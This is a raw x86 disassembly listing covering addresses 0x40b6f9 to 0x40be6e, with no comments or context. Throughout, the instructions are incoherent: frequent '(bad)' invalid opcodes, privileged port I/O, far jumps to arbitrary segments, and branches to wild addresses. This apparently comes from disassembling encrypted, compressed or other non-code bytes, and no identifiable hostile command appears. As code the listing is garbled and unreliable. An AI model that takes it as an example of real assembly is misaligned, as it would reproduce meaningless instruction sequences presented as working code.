  40b6f9:	enter  0xcc65,0xa3
  40b6fd:	loop   0x40b74f
  40b6ff:	(bad)
  40b702:	sti    
  40b703:	ja     0x40b690
  40b705:	je     0x40b6e3
  40b707:	das    
  40b708:	cmp    BYTE PTR [ebx-0x2e],dl
  40b70b:	sub    al,0x93
  40b70d:	sar    DWORD PTR [edx+0x597c2a14],0x38
  40b714:	aad    0x59
  40b716:	mov    edx,0xe6e634d
  40b71b:	dec    ecx
  40b71c:	pop    ss
  40b71d:	inc    ecx
  40b71e:	loopne 0x40b6d6
  40b720:	std    
  40b721:	cli    
  40b722:	test   BYTE PTR [edx],bl
  40b724:	mov    ch,0xf9
  40b726:	retf   
  40b727:	mov    bl,BYTE PTR [edi-0xe938cc5]
  40b72d:	out    0xd0,eax
  40b72f:	sbb    ebx,DWORD PTR [eax-0x62f33950]
  40b735:	lea    ebp,[ebx-0x23]
  40b738:	cld    
  40b739:	jns    0x40b6d4
  40b73b:	pop    ds
  40b73c:	jmp    0x40b73b
  40b73e:	sbb    al,BYTE PTR [esi]
  40b740:	fidivr WORD PTR [eax+0x25e3cc76]
  40b746:	mov    al,0xc1
  40b748:	sbb    dl,al
  40b74a:	aaa    
  40b74b:	nop
  40b74c:	jnp    0x40b76f
  40b74e:	int3   
  40b74f:	adc    esi,ecx
  40b751:	aaa    
  40b752:	cmovnp edi,DWORD PTR [eax-0x5b]
  40b756:	push   esi
  40b757:	lea    edx,[esi]
  40b759:	push   cs
  40b75a:	push   0x4fe3345f
  40b75f:	fdivr  QWORD PTR [ebx-0xe]
  40b762:	push   edx
  40b763:	(bad)  
  40b764:	and    al,0xe2
  40b766:	adc    BYTE PTR [eax-0x19583718],dh
  40b76c:	cmc    
  40b76d:	fst    st(6)
  40b76f:	mov    BYTE PTR [eax],dl
  40b771:	mov    ds:0x99484c84,al
  40b776:	aad    0x2e
  40b778:	pop    edi
  40b779:	push   edx
  40b77a:	dec    ebp
  40b77b:	jns    0x40b7d0
  40b77d:	jnp    0x40b758
  40b77f:	inc    edx
  40b780:	and    ecx,DWORD PTR [edx+0x55]
  40b783:	clc    
  40b784:	arpl   WORD PTR [ebx+ebp*2],sp
  40b787:	push   ebp
  40b788:	in     eax,dx
  40b789:	xchg   ebx,eax
  40b78a:	or     DWORD PTR [ecx-0x6040f0e3],eax
  40b790:	xor    dh,BYTE PTR [esi-0x32]
  40b793:	test   BYTE PTR [ecx-0x25468f63],ah
  40b799:	icebp  
  40b79a:	adc    ch,ah
  40b79c:	mov    ebx,0x46c82942
  40b7a1:	cmp    cl,0xe9
  40b7a4:	lea    eax,[ecx+0x223c6c65]
  40b7aa:	sbb    cl,BYTE PTR [esi+0x5e]
  40b7ad:	stos   BYTE PTR es:[edi],al
  40b7ae:	cmp    ecx,DWORD PTR ds:0x103a6661
  40b7b4:	sbb    eax,0x20a225af
  40b7b9:	push   eax
  40b7ba:	mov    al,ds:0x932c131a
  40b7bf:	aaa    
  40b7c0:	or     eax,0x42aa32d0
  40b7c5:	outs   dx,BYTE PTR ds:[esi]
  40b7c6:	jmp    0xb702:0x75091e02
  40b7cd:	test   BYTE PTR [esi-0x5022ed4b],bl
  40b7d3:	or     edx,DWORD PTR [edi+0x410d5b41]
  40b7d9:	jns    0x40b7d0
  40b7db:	push   ecx
  40b7dc:	pop    ss
  40b7dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7de:	or     edx,DWORD PTR [eax-0x68]
  40b7e1:	mov    ebp,0xf4657efd
  40b7e6:	in     eax,dx
  40b7e7:	pop    edi
  40b7e8:	mov    al,0x81
  40b7ea:	in     eax,dx
  40b7eb:	mov    esi,0x1b8cd49b
  40b7f0:	sub    al,0xce
  40b7f2:	stos   DWORD PTR es:[edi],eax
  40b7f3:	call   0x6dec5e57
  40b7f8:	es into 
  40b7fa:	push   eax
  40b7fb:	jp     0x40b7be
  40b7fd:	in     al,0x5
  40b7ff:	inc    ebx
  40b800:	add    al,0x34
  40b802:	icebp  
  40b803:	test   BYTE PTR [esi-0x9bfc529],cl
  40b809:	stos   DWORD PTR es:[edi],eax
  40b80a:	sbb    DWORD PTR [esp+ebx*4-0x5e91ba05],ebx
  40b811:	lock xchg esp,eax
  40b813:	rol    BYTE PTR [edi-0x3ac1cba3],0xd5
  40b81a:	cwde   
  40b81b:	fsubp  st(3),st
  40b81d:	mov    ebx,DWORD PTR [edx+0x43]
  40b820:	inc    edi
  40b821:	fs (bad) 
  40b823:	loop   0x40b81c
  40b825:	or     BYTE PTR [ecx-0x4b0ff8e5],dh
  40b82b:	dec    esi
  40b82c:	xor    al,0xca
  40b82e:	int    0x73
  40b830:	cwde   
  40b831:	add    BYTE PTR [eax-0x72287e5b],ah
  40b837:	imul   eax,DWORD PTR [ecx],0xb7b97e53
  40b83d:	and    al,BYTE PTR [ecx]
  40b83f:	add    BYTE PTR [ebx],ah
  40b841:	in     eax,dx
  40b842:	xor    DWORD PTR [ecx+0x39],esi
  40b845:	imul   edx,DWORD PTR [edx+0x11],0x1a
  40b849:	push   ebx
  40b84a:	das    
  40b84b:	test   DWORD PTR [edi],ebx
  40b84d:	mov    ebp,0x12af246
  40b852:	inc    eax
  40b853:	or     edi,DWORD PTR [ecx]
  40b855:	inc    edi
  40b856:	cmp    edi,edi
  40b858:	sbb    DWORD PTR [edx],ebx
  40b85a:	ror    bh,cl
  40b85c:	xor    BYTE PTR [eax-0x54d05e42],0x9b
  40b863:	pop    ebp
  40b864:	adc    eax,0x2ad3638e
  40b869:	xor    DWORD PTR ds:0x4114f980,0xffffffac
  40b870:	scas   eax,DWORD PTR es:[edi]
  40b871:	repz in eax,dx
  40b873:	xchg   esp,eax
  40b874:	fs pop eax
  40b876:	inc    esi
  40b877:	ins    DWORD PTR es:[edi],dx
  40b878:	pop    ss
  40b879:	or     eax,edi
  40b87b:	popf   
  40b87c:	or     BYTE PTR [eax-0x446dac72],dh
  40b882:	out    0x2f,eax
  40b884:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b885:	sub    al,0x34
  40b887:	cli    
  40b888:	(bad)
  40b88c:	daa    
  40b88d:	and    BYTE PTR [ecx+0x59244a25],al
  40b893:	pop    ss
  40b894:	push   0x31
  40b896:	mov    ebp,0xe8e25b3
  40b89b:	dec    esp
  40b89c:	sbb    eax,0x2c5ec7ef
  40b8a1:	inc    ebp
  40b8a2:	(bad)  
  40b8a4:	push   esp
  40b8a5:	mov    ch,0xf
  40b8a7:	add    ebx,DWORD PTR [ebx-0x60]
  40b8aa:	xchg   esi,eax
  40b8ab:	xor    ch,ch
  40b8ad:	inc    ebx
  40b8ae:	or     cl,BYTE PTR [ebx+0x2e]
  40b8b1:	push   ebx
  40b8b2:	gs mov cl,0x11
  40b8b5:	out    0xa7,eax
  40b8b7:	pop    ss
  40b8b8:	pushf  
  40b8b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8ba:	out    dx,eax
  40b8bb:	xchg   esi,eax
  40b8bc:	repnz push ds
  40b8be:	daa    
  40b8bf:	lods   al,BYTE PTR ds:[esi]
  40b8c0:	aad    0xad
  40b8c2:	ins    DWORD PTR es:[edi],dx
  40b8c3:	jne    0x40b8a6
  40b8c5:	mov    ecx,0xb1ec8083
  40b8ca:	aam    0x7e
  40b8cc:	icebp  
  40b8cd:	or     bl,dl
  40b8cf:	cs add al,0x66
  40b8d2:	or     DWORD PTR [edx+0x3],edx
  40b8d5:	or     eax,0xa0ff447
  40b8da:	pusha  
  40b8db:	ret    0x83c8
  40b8de:	adc    DWORD PTR [edi+0x31],0x4f902a13
  40b8e5:	adc    DWORD PTR [ecx],edi
  40b8e7:	push   edx
  40b8e8:	jmp    0xb6306fe
  40b8ed:	ret    0xe39a
  40b8f0:	push   0x2f362302
  40b8f5:	mov    esi,0x3c8c3137
  40b8fa:	test   BYTE PTR [eax+edi*2],cl
  40b8fd:	sbb    eax,0xa319074e
  40b902:	je     0x40b93c
  40b904:	sub    ebp,edx
  40b906:	pop    esi
  40b907:	mov    eax,0xdf2d104f
  40b90c:	jg     0x40b954
  40b90e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b90f:	sbb    DWORD PTR [edi+0x5c],ebp
  40b912:	cmp    DWORD PTR [ecx],edi
  40b914:	mov    eax,ds:0x8602067c
  40b919:	fild   DWORD PTR ds:0x26b2c047
  40b920:	push   ecx
  40b921:	stc    
  40b922:	sbb    DWORD PTR [ebp+0x6e743ce3],ebx
  40b928:	lods   eax,DWORD PTR ds:[esi]
  40b929:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b92a:	iret   
  40b92b:	fild   DWORD PTR [edx]
  40b92d:	mov    ds,WORD PTR [edx+0xa]
  40b930:	xchg   ecx,eax
  40b931:	dec    edi
  40b932:	add    DWORD PTR [esi+0x41],ebx
  40b935:	jmp    0x40b9b1
  40b937:	lock adc ebp,esp
  40b93a:	mov    esi,0xb93cd02f
  40b93f:	dec    esi
  40b940:	lods   al,BYTE PTR ds:[esi]
  40b941:	mov    ebp,0xf5976e82
  40b946:	sbb    al,0xc2
  40b948:	leave  
  40b949:	mov    DWORD PTR [ecx-0x70],edi
  40b94c:	push   ecx
  40b94d:	xor    eax,0x67cb75ab
  40b952:	aas    
  40b953:	shr    DWORD PTR [esi-0x1d],cl
  40b956:	xor    al,0x7d
  40b958:	jp     0x40b992
  40b95a:	mov    ecx,0xbaa53f3
  40b95f:	loope  0x40b9d5
  40b961:	stos   DWORD PTR es:[edi],eax
  40b962:	das    
  40b963:	(bad)  
  40b965:	fisubr DWORD PTR [edi+0x7d]
  40b968:	enter  0x7266,0xae
  40b96c:	jnp    0x40b952
  40b96e:	out    0x65,eax
  40b970:	std    
  40b971:	int    0x7b
  40b973:	dec    esp
  40b974:	jo     0x40b95c
  40b976:	mov    ecx,0x86487ad2
  40b97b:	shl    BYTE PTR [edi],0x31
  40b97e:	mov    ds:0x391f36dc,al
  40b983:	mov    al,0x18
  40b985:	dec    esi
  40b986:	in     eax,dx
  40b987:	(bad)  
  40b988:	out    dx,eax
  40b989:	shr    BYTE PTR [eax*4+0x7ca73eec],cl
  40b990:	(bad)  
  40b991:	and    ecx,edx
  40b993:	repnz xor BYTE PTR [esi],dl
  40b996:	and    al,0x60
  40b998:	ret    0x4cdf
  40b99b:	xor    eax,0x78c39de9
  40b9a0:	sar    DWORD PTR [edx+0x1bb09ae],1
  40b9a6:	sub    BYTE PTR [esi-0x60],dl
  40b9a9:	addr16 mov ch,0x4d
  40b9ac:	mov    ecx,0x7e2baeec
  40b9b1:	sub    ah,BYTE PTR [ebp-0x1c]
  40b9b4:	sbb    al,0x7e
  40b9b6:	out    0x32,eax
  40b9b8:	push   ebx
  40b9b9:	pop    ebx
  40b9ba:	adc    eax,0xd7c4368a
  40b9bf:	out    dx,eax
  40b9c0:	test   eax,0x50bbfc9c
  40b9c5:	dec    ecx
  40b9c6:	outs   dx,DWORD PTR ds:[esi]
  40b9c7:	fcomip st,st(6)
  40b9c9:	fwait
  40b9ca:	inc    esi
  40b9cb:	fnstsw WORD PTR [ebx-0x67]
  40b9ce:	xchg   edx,eax
  40b9cf:	ret    0xa62b
  40b9d2:	mov    esi,0x57d5985d
  40b9d7:	jl     0x40ba47
  40b9d9:	dec    ebp
  40b9da:	inc    eax
  40b9db:	popf   
  40b9dc:	sub    edi,DWORD PTR [ebp+edx*2-0x2b2f9112]
  40b9e3:	push   esi
  40b9e4:	(bad)  
  40b9e5:	mov    ss,WORD PTR [eax+0x40]
  40b9e8:	stc    
  40b9e9:	jmp    0x40b9db
  40b9eb:	mov    cl,cl
  40b9ed:	cwde   
  40b9ee:	xchg   edi,eax
  40b9ef:	cmp    BYTE PTR [esi],ah
  40b9f1:	and    al,bl
  40b9f3:	sbb    DWORD PTR [ebx+0x45],ebx
  40b9f6:	jmp    0x857d:0xaa0622ea
  40b9fd:	ret    
  40b9fe:	or     eax,0x7be40757
  40ba03:	bound  ebx,QWORD PTR [edx]
  40ba05:	shl    BYTE PTR [ebp-0x2585c696],cl
  40ba0b:	push   ecx
  40ba0c:	jno    0x40ba14
  40ba0e:	cmovno ebx,ebx
  40ba11:	xchg   ebx,eax
  40ba12:	sbb    BYTE PTR [esi],bh
  40ba14:	cwde   
  40ba15:	add    edx,DWORD PTR [ebx]
  40ba17:	pop    ecx
  40ba18:	mov    ds,WORD PTR [ebp+ecx*1-0xed48682]
  40ba1f:	dec    esi
  40ba20:	add    eax,0xb0d81cf5
  40ba25:	xor    DWORD PTR [ecx-0x255acb61],ecx
  40ba2b:	mov    ds:0xfa4856d7,eax
  40ba30:	cmp    dl,BYTE PTR [ebp+0xc]
  40ba33:	push   ss
  40ba34:	in     eax,0xb
  40ba36:	enter  0x840d,0xb5
  40ba3a:	xor    bl,BYTE PTR [eax+0x20]
  40ba3d:	adc    eax,0xfd1d9877
  40ba42:	clc    
  40ba43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba44:	aaa    
  40ba45:	dec    edx
  40ba46:	and    BYTE PTR [ebx+ebp*2+0x2a7420bb],ch
  40ba4d:	push   ebp
  40ba4e:	jns    0x40ba7c
  40ba50:	push   0xffffff95
  40ba52:	pop    esp
  40ba53:	pop    ebp
  40ba54:	pop    ss
  40ba55:	sub    eax,0x3f86db8e
  40ba5a:	(bad)  
  40ba5b:	call   0x26ef:0x136c0a19
  40ba62:	mov    edi,0xf9768a7d
  40ba67:	dec    ebp
  40ba68:	cmp    ecx,ebp
  40ba6a:	std    
  40ba6b:	aam    0xa5
  40ba6d:	sar    BYTE PTR ds:0xfba0c06d,1
  40ba73:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40ba75:	add    DWORD PTR [esi-0x55d0c452],esi
  40ba7b:	mov    al,0xab
  40ba7d:	xor    DWORD PTR [esi+ebp*4+0x4f],ebx
  40ba81:	pop    edi
  40ba82:	ret    0x69d6
  40ba85:	rcl    DWORD PTR [eax-0x5],0x83
  40ba89:	xor    al,0x3a
  40ba8b:	clc    
  40ba8c:	jmp    0x710876b7
  40ba91:	in     eax,0x78
  40ba93:	mov    ch,0x5f
  40ba95:	mov    ch,0x40
  40ba97:	mov    ah,0xcc
  40ba99:	dec    esi
  40ba9a:	dec    ebx
  40ba9b:	or     eax,DWORD PTR [ebx]
  40ba9d:	add    al,0xc9
  40ba9f:	mov    ebx,0x5d2de71d
  40baa4:	jge    0x40ba71
  40baa6:	imul   edx,DWORD PTR [edi-0x64],0xffffffcb
  40baaa:	xchg   ecx,eax
  40baab:	fld    DWORD PTR [ebx+0x3e5efdab]
  40bab1:	add    edx,DWORD PTR [esi-0x20]
  40bab4:	or     bl,cl
  40bab6:	push   edi
  40bab7:	fs jg  0x40baf1
  40baba:	stos   DWORD PTR es:[edi],eax
  40babb:	xor    BYTE PTR [edi+0x39d7045e],ah
  40bac1:	fdiv   st,st(2)
  40bac3:	sub    edx,ebp
  40bac5:	inc    edx
  40bac6:	jge    0x40ba85
  40bac8:	push   0xc
  40baca:	ins    DWORD PTR es:[edi],dx
  40bacb:	and    al,0x39
  40bacd:	push   ebp
  40bace:	bound  eax,QWORD PTR [edx-0x75]
  40bad1:	xor    DWORD PTR [eax],0xc
  40bad4:	sbb    bh,BYTE PTR [eax+0x29]
  40bad7:	push   ds
  40bad8:	or     al,BYTE PTR [esi-0x4a]
  40badb:	repz inc esp
  40badd:	gs retf 
  40badf:	cdq    
  40bae0:	scas   eax,DWORD PTR es:[edi]
  40bae1:	imul   eax,DWORD PTR [esi-0x33],0x37d765b8
  40bae8:	fisttp WORD PTR [edx+0x23]
  40baeb:	aam    0xd4
  40baed:	mov    ch,0x18
  40baef:	repnz adc edi,esp
  40baf2:	aad    0xed
  40baf4:	repz retf 0xad52
  40baf8:	scas   al,BYTE PTR es:[edi]
  40baf9:	repnz gs out 0x41,eax
  40bafd:	dec    esi
  40bafe:	mov    bh,0x32
  40bb00:	mov    esi,0xd81defd1
  40bb05:	loopne 0x40bb0a
  40bb07:	loope  0x40ba98
  40bb09:	cmp    eax,0x372b7c38
  40bb0e:	popa   
  40bb0f:	mov    ds:0x5c36e52,al
  40bb14:	sahf   
  40bb15:	in     al,0xb8
  40bb17:	push   esi
  40bb18:	fmul   DWORD PTR ds:0xe86e8916
  40bb1e:	int    0x6e
  40bb20:	mov    eax,ds:0x85b050db
  40bb25:	(bad)  
  40bb26:	int3   
  40bb27:	in     eax,dx
  40bb28:	(bad)  
  40bb29:	ror    bh,1
  40bb2b:	mov    eax,ds
  40bb2d:	pop    esp
  40bb2e:	adc    eax,0x84c78888
  40bb33:	fbld   TBYTE PTR [ebx-0x1c0abaa4]
  40bb39:	mov    dl,BYTE PTR [edx+0x3074c6c1]
  40bb3f:	dec    edx
  40bb40:	add    al,0x0
  40bb42:	gs or  al,0x50
  40bb45:	mov    eax,DWORD PTR [ecx-0x56dd3110]
  40bb4b:	jbe    0x40baef
  40bb4d:	inc    BYTE PTR ss:[ecx-0x2d]
  40bb51:	ret    0x1cd0
  40bb54:	inc    edi
  40bb55:	inc    esi
  40bb56:	mov    ds:0xb9b49fe4,eax
  40bb5b:	ficomp DWORD PTR ds:0x31f2c443
  40bb61:	not    BYTE PTR [bp+di]
  40bb64:	into   
  40bb65:	in     al,dx
  40bb66:	and    DWORD PTR [ecx-0x79a7101d],esp
  40bb6c:	pop    esp
  40bb6d:	imul   edx,DWORD PTR [esi],0xffffff92
  40bb70:	xchg   esi,eax
  40bb71:	adc    ebp,DWORD PTR [edx]
  40bb73:	sub    DWORD PTR [esi],ecx
  40bb75:	push   ebp
  40bb76:	mov    ah,bh
  40bb78:	enter  0x8ef8,0xc5
  40bb7c:	pop    ds
  40bb7d:	pop    ebx
  40bb7e:	aam    0x4b
  40bb80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb81:	inc    ecx
  40bb82:	daa    
  40bb83:	cwde   
  40bb84:	dec    ebx
  40bb85:	fisttp WORD PTR [ecx+0x60923937]
  40bb8b:	call   0x7270:0x3a426e07
  40bb92:	jnp    0x40bb55
  40bb94:	out    dx,al
  40bb95:	mov    dh,0xcc
  40bb97:	lea    ebx,[ebp+0x19]
  40bb9a:	sub    eax,0x41b8aa8f
  40bb9f:	and    ch,ah
  40bba1:	xchg   DWORD PTR [eax-0x62e1e792],esi
  40bba7:	fwait
  40bba8:	inc    ebp
  40bba9:	popf   
  40bbaa:	enter  0xbece,0x74
  40bbae:	xchg   ebx,eax
  40bbaf:	in     al,dx
  40bbb0:	call   0xc6444b8d
  40bbb5:	inc    eax
  40bbb6:	jl     0x40bb7a
  40bbb8:	outs   dx,BYTE PTR ds:[esi]
  40bbb9:	push   ecx
  40bbba:	mov    ds:0x68eb6f6f,al
  40bbbf:	add    al,0x2
  40bbc1:	rcl    BYTE PTR [ecx+0x3c8a5c1d],1
  40bbc7:	not    BYTE PTR [esi+ecx*2-0x32a9e01d]
  40bbce:	mov    cl,0x2a
  40bbd0:	sbb    ah,BYTE PTR [edi+0x3]
  40bbd3:	pop    edx
  40bbd4:	ins    BYTE PTR es:[edi],dx
  40bbd5:	and    edx,DWORD PTR [eax-0x40]
  40bbd8:	rcr    DWORD PTR [eax-0x1a57a279],cl
  40bbde:	xchg   BYTE PTR [edx+ebp*1-0x3f],dl
  40bbe2:	push   es
  40bbe3:	sbb    eax,0xd9fdabdf
  40bbe8:	sub    ebx,DWORD PTR [edx-0x3a]
  40bbeb:	mov    dl,0xda
  40bbed:	pop    edx
  40bbee:	fdivr  QWORD PTR [ebp-0x68]
  40bbf1:	leave  
  40bbf2:	jmp    0x31dff4b7
  40bbf7:	jae    0x40bc51
  40bbf9:	mov    edi,0x2b5f67ff
  40bbfe:	adc    BYTE PTR [ebx],cl
  40bc00:	test   al,0xd7
  40bc02:	sub    al,0xe9
  40bc04:	retf   
  40bc05:	sbb    DWORD PTR [esi+0x72abcbf6],0xffffffe0
  40bc0c:	(bad)  
  40bc0d:	lds    ebx,FWORD PTR [esi+0xf]
  40bc10:	sbb    BYTE PTR [ebp+0x4e7fff3e],bh
  40bc16:	sbb    al,0x3
  40bc18:	or     bh,0x13
  40bc1b:	or     al,0x93
  40bc1d:	sub    BYTE PTR [eax+0x77],cl
  40bc20:	adc    BYTE PTR [eax+edx*8-0xe],ch
  40bc24:	addr16 dec esp
  40bc26:	(bad)  
  40bc27:	sub    edi,ebp
  40bc29:	in     eax,0x22
  40bc2b:	push   ebx
  40bc2c:	push   esp
  40bc2d:	sbb    al,0x14
  40bc2f:	test   eax,0xe6fc2b8b
  40bc34:	int    0x76
  40bc36:	aad    0xca
  40bc38:	jle    0x40bbe3
  40bc3a:	bound  ecx,QWORD PTR [ebx+0x181d1a23]
  40bc40:	xor    ebx,ebx
  40bc42:	xchg   bh,dl
  40bc44:	popf   
  40bc45:	mov    eax,0x67be41a4
  40bc4a:	adc    DWORD PTR [edx+ecx*1-0x39],0x22
  40bc4f:	jae    0x40bc2e
  40bc51:	jle    0x40bc28
  40bc53:	mov    al,0x5d
  40bc55:	aam    0x67
  40bc57:	out    0x26,eax
  40bc59:	and    BYTE PTR [edx],ch
  40bc5b:	in     al,0x9c
  40bc5d:	push   eax
  40bc5e:	js     0x40bcac
  40bc60:	(bad)  
  40bc62:	sahf   
  40bc63:	pusha  
  40bc64:	sbb    ah,BYTE PTR [edx-0x63faaa7b]
  40bc6a:	add    ebx,DWORD PTR [ebx]
  40bc6c:	or     bh,al
  40bc6e:	aad    0x2d
  40bc70:	push   ebp
  40bc71:	gs push edi
  40bc73:	mov    edi,0xfd928d8b
  40bc78:	cwde   
  40bc79:	or     BYTE PTR [eax-0xc2dfcdd],bl
  40bc7f:	or     bh,BYTE PTR [esp+edx*4+0x14fc2e9e]
  40bc86:	jmp    0x95d9:0xe312de85
  40bc8d:	mov    ebx,0x7e9d6e13
  40bc92:	dec    edx
  40bc93:	mov    ds:0x57a33633,eax
  40bc98:	loopne 0x40bc36
  40bc9a:	fild   QWORD PTR [ecx]
  40bc9c:	(bad)  
  40bc9d:	idiv   BYTE PTR [ebx-0x7f72d0b5]
  40bca3:	stc    
  40bca4:	(bad)  
  40bca5:	out    dx,al
  40bca6:	lods   eax,DWORD PTR ds:[esi]
  40bca7:	mov    al,0x78
  40bca9:	fld    TBYTE PTR [esi+0xf]
  40bcac:	les    edx,FWORD PTR [ecx]
  40bcae:	test   DWORD PTR [ebp+0x71c512ba],edx
  40bcb4:	lahf   
  40bcb5:	aaa    
  40bcb6:	into   
  40bcb7:	dec    ebx
  40bcb8:	pushf  
  40bcb9:	adc    DWORD PTR [edi],0x3f
  40bcbc:	xchg   edi,eax
  40bcbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcbe:	pop    ss
  40bcbf:	mov    dl,0xc7
  40bcc1:	leave  
  40bcc2:	sub    ch,0x6f
  40bcc5:	lods   eax,DWORD PTR ds:[esi]
  40bcc6:	mov    ebx,0x2defd6a6
  40bccb:	pop    ebp
  40bccc:	in     al,dx
  40bccd:	dec    edi
  40bcce:	in     al,0x9e
  40bcd0:	ret    0xc04
  40bcd3:	imul   eax,DWORD PTR [esi-0x45b3901],0xffffff96
  40bcda:	push   ecx
  40bcdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcdd:	gs push esi
  40bcdf:	mov    esp,DWORD PTR [edx]
  40bce1:	call   0xc128:0xa8aadd1c
  40bce8:	inc    esi
  40bce9:	sbb    eax,0x8bc47b21
  40bcee:	in     eax,dx
  40bcef:	dec    edx
  40bcf0:	dec    ecx
  40bcf1:	in     eax,0x6d
  40bcf3:	leave  
  40bcf4:	or     eax,0x314a00e2
  40bcf9:	sbb    al,0x2c
  40bcfb:	fist   DWORD PTR [esi+0x73]
  40bcfe:	ins    DWORD PTR es:[edi],dx
  40bcff:	push   ds
  40bd00:	jmp    0x40bcdc
  40bd02:	inc    edx
  40bd03:	ds ds add dh,dl
  40bd07:	jns    0x40bd52
  40bd09:	jp     0x40bd4e
  40bd0b:	jne    0x40bd31
  40bd0d:	scas   al,BYTE PTR es:[edi]
  40bd0e:	(bad)  
  40bd0f:	pop    eax
  40bd10:	xchg   ecx,eax
  40bd11:	inc    esi
  40bd12:	mov    eax,0x5ec6bcc5
  40bd17:	push   cs
  40bd18:	mov    cl,0x5a
  40bd1a:	test   DWORD PTR fs:[edi+0x13ada672],esp
  40bd21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd22:	pop    ebx
  40bd23:	adc    al,0x39
  40bd25:	sbb    DWORD PTR [eax+esi*8+0x4da2c07d],esp
  40bd2c:	fadd   QWORD PTR [ecx+0x16]
  40bd2f:	mov    al,0xf6
  40bd31:	pop    ds
  40bd32:	cwde   
  40bd33:	sub    esp,ebx
  40bd35:	push   ss
  40bd36:	call   0xa06a0418
  40bd3b:	ficom  DWORD PTR [esi]
  40bd3d:	sub    BYTE PTR [ebx-0x44],0xdc
  40bd41:	int3   
  40bd42:	sub    bl,ah
  40bd44:	sub    bl,BYTE PTR [esi]
  40bd46:	jnp    0x40bd0d
  40bd48:	pop    esi
  40bd49:	sbb    eax,0x840c401e
  40bd4e:	(bad)  
  40bd4f:	push   esp
  40bd50:	les    esi,FWORD PTR [ecx-0x2a]
  40bd53:	mov    bl,0x1e
  40bd55:	in     al,dx
  40bd56:	shl    BYTE PTR [edx],1
  40bd58:	sbb    esp,eax
  40bd5a:	push   esi
  40bd5b:	(bad)  [ecx+0x5e]
  40bd5e:	dec    ebp
  40bd5f:	ficomp DWORD PTR [ecx-0x4d]
  40bd62:	bound  ebx,QWORD PTR [ebx+eax*4-0x50]
  40bd66:	lods   al,BYTE PTR ds:[esi]
  40bd67:	sbb    al,0xdc
  40bd69:	daa    
  40bd6a:	mov    esp,0xca3936ae
  40bd6f:	bound  esi,QWORD PTR [eax+0x34]
  40bd72:	push   edi
  40bd73:	(bad)  
  40bd74:	popf   
  40bd75:	xchg   ebx,eax
  40bd76:	jmp    0x40bdc7
  40bd78:	dec    ebx
  40bd79:	add    DWORD PTR [edx+ebx*1],edi
  40bd7c:	ds push 0xfffffff9
  40bd7f:	imul   edx,DWORD PTR gs:[esi],0xffffff94
  40bd83:	jo     0x40bd61
  40bd85:	pop    edi
  40bd86:	scas   al,BYTE PTR es:[edi]
  40bd87:	cs std 
  40bd89:	sti    
  40bd8a:	data16 test bl,cl
  40bd8d:	pop    esp
  40bd8e:	js     0x40bd31
  40bd90:	shl    BYTE PTR [ebp+esi*1+0x702c4a4c],1
  40bd97:	(bad)  
  40bd98:	jbe    0x40bdf7
  40bd9a:	mov    al,ds:0xccc9fdbc
  40bd9f:	inc    eax
  40bda0:	ret    0x67f6
  40bda3:	and    DWORD PTR [esi-0xbea86d0],ebp
  40bda9:	pop    ebx
  40bdaa:	call   DWORD PTR [edx-0x13]
  40bdad:	out    dx,al
  40bdae:	shl    BYTE PTR [ebp+0x4a],0x9e
  40bdb2:	nop
  40bdb3:	mov    dh,0xfd
  40bdb5:	imul   eax,esi,0x6f
  40bdb8:	shl    BYTE PTR [edi],0x5a
  40bdbb:	jmp    0x886ed646
  40bdc0:	clc    
  40bdc1:	fild   DWORD PTR [ecx+0x5e]
  40bdc4:	xchg   esi,eax
  40bdc5:	retf   
  40bdc6:	mov    ds:0x725c4c2a,al
  40bdcb:	jno    0x40bdbd
  40bdcd:	fild   QWORD PTR [eax-0x2cf1792d]
  40bdd3:	pop    eax
  40bdd4:	jns    0x40bdcd
  40bdd6:	loopne 0x40bda7
  40bdd8:	retf   0xbc04
  40bddb:	test   eax,esp
  40bddd:	inc    edi
  40bdde:	or     BYTE PTR [ecx],ah
  40bde0:	es or  al,0x51
  40bde3:	fisubr WORD PTR [eax]
  40bde5:	mov    gs,WORD PTR [edi+0x66ad115d]
  40bdeb:	pop    edx
  40bdec:	loop   0x40bdf3
  40bdee:	daa    
  40bdef:	xor    BYTE PTR [edx-0x72],dl
  40bdf2:	mov    ds:0x27418499,eax
  40bdf7:	(bad)  
  40bdf8:	lock je 0x40be22
  40bdfb:	pop    edx
  40bdfc:	add    dl,BYTE PTR [ecx-0x55a3d93c]
  40be02:	imul   esi,DWORD PTR [edi-0x41ed56c0],0xfd59c78c
  40be0c:	sub    BYTE PTR [edi-0x10e81e28],bh
  40be12:	cmp    al,0xf6
  40be14:	sub    al,0x6e
  40be16:	or     eax,0x8ace8e5b
  40be1b:	lods   eax,DWORD PTR ds:[esi]
  40be1c:	mov    DWORD PTR [edi-0x6b71a95],esi
  40be22:	outs   dx,DWORD PTR ds:[esi]
  40be23:	mov    bl,0x38
  40be25:	stos   BYTE PTR es:[edi],al
  40be26:	dec    esi
  40be27:	push   ebp
  40be28:	int    0x8
  40be2a:	pop    ds
  40be2b:	pusha  
  40be2c:	sbb    dh,dl
  40be2e:	push   ebp
  40be2f:	sub    bh,dl
  40be31:	sbb    eax,0xc8224872
  40be36:	mov    ecx,0xaff6782a
  40be3b:	ss pop ecx
  40be3d:	mov    ebx,0xdb61c490
  40be42:	cmp    esi,ecx
  40be44:	repnz pop edi
  40be46:	sahf   
  40be47:	cmp    dl,BYTE PTR [eax+0x40]
  40be4a:	pop    ds
  40be4b:	or     ebx,DWORD PTR [ebx+0x1e]
  40be4e:	mov    WORD PTR [ebp-0x18b59f16],ds
  40be54:	es (bad) 
  40be56:	mov    ds:0xb3d83269,eax
  40be5b:	outs   dx,DWORD PTR ds:[esi]
  40be5c:	cli    
  40be5d:	pusha  
  40be5e:	mov    ds:0x5715bebb,al
  40be63:	pop    fs
  40be65:	xchg   BYTE PTR [edi+edx*4],cl
  40be68:	mov    eax,ds:0x7547e35f
  40be6d:	cld    
  40be6e:	or     eax,0x953455e8
